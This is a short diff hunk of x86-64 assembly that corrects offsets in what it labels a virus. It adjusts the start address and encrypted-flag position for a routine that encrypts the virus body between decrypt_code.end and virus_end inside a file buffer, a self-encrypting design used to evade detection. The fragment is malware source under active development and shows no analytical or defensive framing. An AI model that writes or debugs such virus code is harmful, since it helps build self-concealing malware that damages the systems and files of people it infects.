@@ -154,12 +154,12 @@ _start:
     test rcx, rcx
     jnz .write_key
     
-    ; Set encrypted flag at virus_start + 8 + 16 = 0x13de
+    ; Set encrypted flag at virus_start + 24 = 0x13de
     mov byte [rdi], 1
     
-    ; Encrypt from decrypt_code.end (0x151d) to virus_end (0x1b54)
+    ; Encrypt from decrypt_code.end (0x1522) to virus_end (0x1b59)
     lea rdi, [rel file_buffer]
-    add rdi, 0x151d
+    add rdi, 0x1522
     mov rsi, 0x637      ; Size: virus_end - decrypt_code.end
     call encrypt_buffer
     
